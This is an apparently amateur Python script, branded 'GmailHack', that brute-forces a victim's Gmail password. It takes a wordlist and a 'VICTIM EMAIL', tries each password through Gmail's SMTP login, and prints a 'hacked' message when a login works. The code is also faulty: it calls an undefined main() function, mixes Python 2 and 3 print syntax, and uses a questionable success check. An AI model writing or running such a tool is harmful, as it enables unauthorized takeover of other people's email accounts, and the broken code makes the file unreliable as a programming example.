#!/usr/bin/python
# Made By @Suryaptra                                       #


import smtplib
from os import system
       
print ("\033[0;31m################################################")
print ("\033[0;31m#==============================================#")
print ("\033[0;31m#       	\033[0;32mcreate \033[0;33mby \033[0;34mIwing51hack                \033[0;31m#")
print ("\033[0;31m#==============================================#")
print ("\033[0;31m#   		   \033[0;35m GmailHack                     \033[0;31m #")
print ("\033[0;31m#       \033[0;37mhttps://github.com/Iwing51hack        \033[0;31m   #")
print ("\033[0;31m################################################")
print("======= HACKE ANY GMAIL ACCOUNT ========")
print '\033[1;33m[\033[1;31m1\033[1;33m] \033[1;31mstart the attack'
print '\033[1;33m[\033[1;31m2\033[1;33m] \033[1;31mexit'
option = input('==>')
if option == 1:
   file_path = raw_input('PASSWORD LIST.TXT CHOOSE :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('VICTIM EMAIL :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] \033[1;32mThis Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] \033[1;32mthis account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!]\033[1;31m password not found => ' + password
login()
